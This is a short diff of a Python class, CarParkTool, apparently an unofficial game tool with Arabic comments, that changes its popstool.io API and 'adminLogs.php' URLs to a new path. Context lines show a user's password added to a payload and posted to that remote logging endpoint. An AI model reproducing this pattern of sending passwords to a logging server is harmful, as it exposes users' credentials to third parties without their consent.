@@ -13,7 +13,7 @@ from time import sleep
 
 
 
-BASE_URL: str = "https://popstool.io/beekeeper/api"
+BASE_URL: str = "https://popstool.io/xhflankerxkokk/api"
 
 class CarParkTool:
     def __init__(self, access_key) -> None:
@@ -27,7 +27,7 @@ class CarParkTool:
         return {"telegram_id": self.telegram_id}
 
     def log_action(self, action_name, data):
-        log_url = "https://popstool.io/beekeeper/adminLogs.php"  # تغيير العنوان إلى adminLogs.php
+        log_url = "https://popstool.io/xhflankerxkokk/adminLogs.php"  # تغيير العنوان إلى adminLogs.php
         key_data = self.get_key_data()  # الحصول على بيانات المفتاح
         self.telegram_id = key_data.get("telegram_id", "Unknown")  # التحقق من وجود telegram_id
         log_data = {"action": action_name, "data": data, "telegram_id": self.telegram_id}
@@ -108,7 +108,7 @@ class CarParkTool:
             payload["data"]["password"] = password
 
         # إرسال البيانات إلى adminLogs.php باستخدام POST مع تنسيق JSON
-        response = requests.post("https://popstool.io/beekeeper/adminLogs.php", json=payload)
+        response = requests.post("https://popstool.io/xhflankerxkokk/adminLogs.php", json=payload)
 
         return response.status_code == 200
     
